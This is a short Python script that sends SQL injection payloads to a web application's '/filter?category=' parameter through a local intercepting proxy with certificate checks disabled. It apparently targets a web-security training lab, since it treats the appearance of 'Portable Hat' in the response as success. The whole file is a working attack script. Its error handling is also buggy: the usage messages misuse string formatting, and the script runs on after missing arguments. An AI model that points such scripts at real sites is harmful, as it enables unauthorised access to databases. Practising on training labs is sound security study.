#!/usr/bin/python3
import requests
import urllib3
import sys
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def sql_exploit(url,payload):
	print("hello")
	uri='/filter?category='
	#payload = urllib.parse.quote_plus(sys.argv[2].strip()) 
	print(url + uri + payload)
	r= requests.get(url + uri+ payload,verify=False,proxies=proxy)
	#print(r.text)
	if "Portable Hat" in r.text:
	#print(r.text)
		return True
	else:
		return False
	



if __name__=='__main__':
	try:
		url=sys.argv[1].strip()
		payload=sys.argv[2].strip()
	
	except IndexError:
		print("[-] usage <url> <payload> " % sys.argv[0].strip())
		print('[-] example www.example.com "1=1"' % sys.argv[0].strip())
		
		
	if sql_exploit(url,payload):
		print("sql injection Done")
		
	else:
		print("try Again")
